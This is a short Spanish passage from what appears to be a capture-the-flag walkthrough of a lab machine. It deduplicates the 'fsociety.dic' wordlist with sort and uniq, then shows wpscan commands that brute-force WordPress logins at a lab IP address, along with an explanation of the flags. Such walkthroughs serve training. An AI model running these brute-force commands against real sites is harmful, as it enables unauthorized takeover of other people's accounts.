- Vamos a ver cuantas lineas tiene el archivo **fsociety.dic**

```
$ wc -l fsociety.dic
```

- Vemos que hay muchas lineas repetidas y vamos a borrarlas con el comando **uniq** y ordenarla alfabeticamente con el comando **sort** y es asi

```
$ sort fsociety.dic | uniq > dic.txt
```

- Voy hacer un escaneo de **wordpress** con el **wpscan** de esta manera

```
$ wpscan --url http://10.10.206.202 -t 50 -U elliot -P ~/Documents/dic.txt
$ wpscan --url http://10.10.206.202 -t 50 -U ~/Documents/dic.txt -P ~/Documents/dic.txt
```

- Las diferentes opciones son estas

```
--Url: especifica la URL completa que desea escanear (no olvide el ' http ')
-t: la cantidad de hilos simultáneos a usar, elegí 50 en este caso
-U: el nombre de usuario a usar (bueno que enumeramos eso antes, ¿eh?)
-P: el archivo de contraseña para usar
```

